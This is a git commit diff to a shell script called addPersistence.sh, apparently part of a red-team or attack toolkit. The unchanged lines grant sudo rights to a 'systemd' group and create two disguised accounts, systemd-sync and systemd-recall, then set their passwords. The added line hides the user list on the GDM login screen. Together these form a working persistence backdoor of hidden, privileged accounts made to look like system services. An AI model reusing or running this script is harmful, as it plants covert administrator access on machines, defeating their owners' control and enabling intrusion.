b9190b323f024515c3779e46f0e945cc7dce4fd1
bodevalley <98053275+bodevalley@users.noreply.github.com>
2022-04-08 14:54:24 -0400

    Update addPersistence.sh

--- scripts/sparky/modules/addPersistence.sh
+++ scripts/sparky/modules/addPersistence.sh
@@ -6,6 +6,8 @@ echo "%systemd ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
 sudo useradd -u 569 -G systemd -M systemd-sync
 sudo useradd -u 570 -G systemd -M systemd-recall
 
+sudo sed -i 's/# disable-user-list=true/ disable-user-list=true/g' /etc/gdm3/greeter.dconf-defaults
+
 echo "Password for sync"
 sudo passwd systemd-sync
 echo "Password for recall"
